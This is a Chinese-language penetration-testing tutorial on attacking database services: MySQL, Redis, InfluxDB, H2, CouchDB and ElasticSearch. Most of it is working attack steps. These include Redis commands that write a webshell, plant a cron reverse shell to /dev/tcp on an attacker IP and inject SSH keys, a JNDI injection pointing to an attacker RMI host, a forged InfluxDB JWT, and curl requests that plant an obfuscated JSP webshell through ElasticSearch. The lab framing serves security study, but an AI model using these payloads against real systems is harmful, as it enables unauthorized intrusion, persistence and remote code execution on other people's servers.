服务安全-数据库

数据库 未授权
服务安全
发布日期:   2022-05-09
文章字数:   1.9k

数据库

常见服务应用的安全测试：

  1. 配置不当-未授权访问
  2. 安全机制-特定安全漏洞
  3. 安全机制-弱口令爆破攻击

服务安全测试流程：

  1. 判断服务是否开放：端口扫描、组合猜测、信息来源
  2. 判断服务类型：数据库、文件传输、远程控制、数据通信
  3. 判断利用方式：特性漏洞、未授权访问、弱口令爆破

1、Mysql

2.1、未授权访问

Mysql默认端口：3306

漏洞编号：CVE-2012-2122

漏洞利用：

for i in `seq 1 1000`; do mysql -uroot -pwrong -h ip -P3306  ; done

2.2、口令猜测

Mysql默认配置本地登录root用户，拒绝远程连接。

猜解口令需借助类似phpmyadmin的第三方数据库管理应用（搭建在对方服务器，数据发送由本地到本地）。

2、Redis

Redis-未授权访问-配置不当

原理：

​ Redis 默认情况下，会绑定在0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器器的情况下未授权访问 Redis 以及读取 Redis 的数据。

配置问题：

bind 注释符开启，表示只允许本地访问

/etc/redis.conf
# bind 127.0.0.1
protected-mode no

2.1、漏洞测试：

在本机搭建redis客户端（redis-cli远程连接工具）连接目标地址。

redis-cli -h 目标ip
info

2.2、利用实例：

Redis 自身的提供的 config 命令，可以进行写文件操作

# 1、Webshell写入													#前提知道web路径				
config set dir /var/tmp										#设置WEB写入目录，目录需有可读写权限
config set dbfilename test.php						#设置写入文件名
set test "<?php phpinfo();?>"							#设置写入文件代码
save																			#保存执行 或者使用 bgsave
# 2、计划任务反弹shell			
config set dir /var/spool/cron/crontabs																			#设置写入计划任务目录
config set dbfilename xxx																										#设置写入文件名
set xx "\n\n\n* * * * * bash -i >$ /dev/tcp/120.55.xx.xx/3333 0>&1\n\n\n"		#设置写入文件代码,在120.55.xx.xx监听
save																																				#保存执行 或者使用 bgsave

攻击者可成功将自己的 ssh 公钥写入目标服务器的／root /. ssh 文件夹的 authotrized keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器器、添加计划任务、写入Webshell等操作。 

# 3、写入Linux ssh-key公钥
# 利用条件：（1）允许异地登录（2）Redis服务使用ROOT账号启动（3）安全模式protected-mode处于关闭状态（4）允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器

ssh-keygen -t rsa																								#生成公钥
cd /root/.ssh/
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt			#将公钥写入key.txt
cat key.txt | redis-cli -h xx.xx.xx.xx -x set hack							#读取公钥并远程连接目标服务器xx.xx.xx.xx并设置为hack
config set dir /root/.ssh/																			#设置写入文件目录
config set dbfilename authorized_keys														#设置写入文件名
save
cd /root/.ssh/
ssh -i id_rsa root@xx.xx.xx.xx																	#使用攻击主机去连接xx.xx.xx.xx

# 4、RCE反弹shell
https://github.com/n0b0dyCN/redis-rogue-server
python redis-rogue-server.py --rhost xx.xx.xx.xx --lhost 120.55.xx.xx --exp=exp.so
																												#	攻击目标主机反弹到120.55.xx.xx;本机监听端口21000

3、Influxdb

Influxdb-未授权访问-Jwt验证不当

默认端口：8086 8088

数据库介绍：Go写成，着力于高性能的查询与存储时序型数据，被广泛应用于存储系统的监控数据，IOT行业的实时数据等场景。

漏洞原因：influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。

  • 在用户开启了认证
  • 且未设置参数shared-secret的情况下

jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。

影响版本： InfluxDB < 1.7.6 的版本

漏洞复现：

通过vulhub搭建环境InfluxDB 1.6.6

（1）借助https://jwt.io/来生成jwt token：

{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "admin",
  "exp": 1676346267
}
//admin是一个已经存在的用户，exp是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳。

（2）发送数据包触发未授权

4、H2database

H2database-未授权访问-配置不当

默认端口：20051

数据库介绍：H2 database是一款Java内存数据库，多用于单元测试。

漏洞原因：H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权。

spring.h2.console.enabled=true 

spring.h2.console.settings.web-allow-others=true

利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。

漏洞利用：

（1）下载JNDI-Injection-Exploit

https://github.com/welk1n/JNDI-Injection-Exploit

（2）生成执行RMI Payload-URL

-C 执行命令 -A 服务器地址

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 120.55.xx.xx

（3）填入URL提交执行

Driver Class：javax.naming.InitialContext

JDBC URL：rmi://120.55.xx.xx:1099/kd1rns

5、CouchDB

CouchDB-权限绕过配合RCE-漏洞

默认端口：5984

影响版本：小于 1.7.0 以及 小于 2.1.1

Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）

CouchDB-权限绕过-CVE-2017-12635

https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py

6、ElasticSearch

常用于配合kibana进行日志分析，数据分析

ElasticSearch-文件写入&RCE-漏洞

默认端口：9200 9300

6.1、Elasticsearch RCE CVE-2014-3120

https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/

6.2、Elasticsearch 文件写入 wooyun_2015_110216

9200一般为ElasticSearch的常用端口，此漏洞环境需要与中间件使用

（1）发现9200端口存在elasticsearch页面，8080存在tomcat目录

（2）利用ElasticSearch写入后门到/usr/local/tomcat/webapps/wwwroot/

# 创建一个恶意索引文档：
curl -XPOST http://目的ip:9200/yz.jsp/yz.jsp/1 -d'
{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
#102:ascii -> f

‘

# 再创建一个恶意的存储库，其中`location`的值即为我要写入的路径：
curl -XPUT 'http://目的ip:9200/_snapshot/yz.jsp' -d '{
     "type": "fs",
     "settings": {
          "location": "/usr/local/tomcat/webapps/wwwroot/",
          "compress": false
     }

#存储库验证并创建：
curl -XPUT "http://目的ip:9200/_snapshot/yz.jsp/yz.jsp" -d '{
    "indices": "yz.jsp",
    "ignore_unavailable": "true",
    "include_global_state": false
}'

（3）访问8080端口snapshot-yz.jsp是我们写入的webshell。

http://目的ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp

（4）该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串
